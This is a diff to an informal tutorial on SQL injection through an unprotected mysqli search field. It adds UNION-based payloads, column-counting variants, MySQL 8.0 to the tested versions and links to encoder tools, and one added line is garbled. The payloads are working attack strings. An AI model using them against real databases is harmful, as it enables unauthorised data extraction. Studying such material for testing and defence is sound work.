@@ -56,7 +56,7 @@ Search field
 
     SQL-injection via proc interface in mysqli
 
-Tested on versions: MariaDB 5.5, MySQL 5.5 (& x64), 5.6
+--> Tested on versions: MariaDB 5.5, MySQL 5.5 (& x64), 5.6, 8.0
 
 What do you need in SQL-inj is pacience. And attacker will definatly have it.
 If i try to break srough
@@ -65,12 +65,17 @@ i cant see Error code but i can see another Error
 "Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in 
 C:\OpenServer\OSPanel\domains\sqlxss\index.php on line 76"
 it can be helpfull too for the attackers.
-SQL-I without error is
+SQL-I without error isqqq% union all select 1,2,3; -- -
 v%' order by 4; -- -
 and now we can check it by... (for example)
 v%' and 1=0 union all select 1,2,3,4; -- -
 or
 v%' union all select 1,2,3,4; -- - (that`s a little bit shorter)
+or 
+v%' union select 1,2,3,4; -- -
+or
+v%' union select 1,2,3,4#
+
 next step
 v%' union all select 1,database(),version(),user(); -- -
 now we know name of the DB, version and Username
@@ -96,6 +101,14 @@ v%' and 1=0 union all select 1,2; -- -
 v%' and 1=0 union all select 1,2,3; -- -
 v%' and 1=0 union all select 1,2,3,4; -- -
 until it works
+v%' union select 1,2,3,4; -- -
+
+<-- Tested on versions: MariaDB 5.5, MySQL 5.5 (& x64), 5.6, 8.0
+
+SQL Encoder
+http://evuln.com/tools/sql-encoder/
+Coder decoder for xss (it could be useful here too)
+http://evuln.com/tools/xss-encoder/
 
 that`s why unprotected Search Fields are very dangerous.
 
